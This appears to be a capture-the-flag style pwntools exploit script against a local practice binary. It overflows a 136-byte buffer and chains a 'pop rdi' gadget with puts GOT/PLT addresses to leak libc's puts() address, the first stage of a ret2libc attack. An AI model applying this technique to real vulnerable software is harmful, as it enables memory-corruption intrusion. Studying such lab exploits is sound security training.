from pwn import *

runelf = ELF('./vuln')	# file vuln
run = runelf.process()	# run vuln

pop_rdi = 0x00400913
# Address of functions
"""
puts in GOT = 0x00601018 - puts in PLT = 0x00400540 - address of main func = 0x00400771
"""

puts_got = runelf.got['puts']
puts_plt = runelf.plt['puts']
main_addr = runelf.symbols['main']

# print the addresses to see if they are correct
log.info(f"puts() address in GOT: {hex(puts_got)}")
log.info(f"puts() address in PLT: {hex(puts_plt)}")
log.info(f"main() address: {hex(main_addr)}")

# Write payload
payload = b"A" * 136
payload += p64(pop_rdi)	# fill the ret address with the address of "pop rdi"
payload += p64(puts_got) # fill the rdi register with the address of puts() in GOT
payload += p64(puts_plt) # calls puts() in PLT
payload += p64(main_addr) # run again the main function

run.sendline(payload)	# Send payload
run.recvline()	# Received line
run.recvline()	# More received line

receive_byte = run.recvline().strip()	# Get the bytes address of puts()
leak_puts = u64(receive_byte.ljust(8, b"\x00"))	# Convert it to integer 64-bits and add "\x00" if the address is not long enough
log.info(f"Finally we have leaked puts() address: {hex(leak_puts)}")
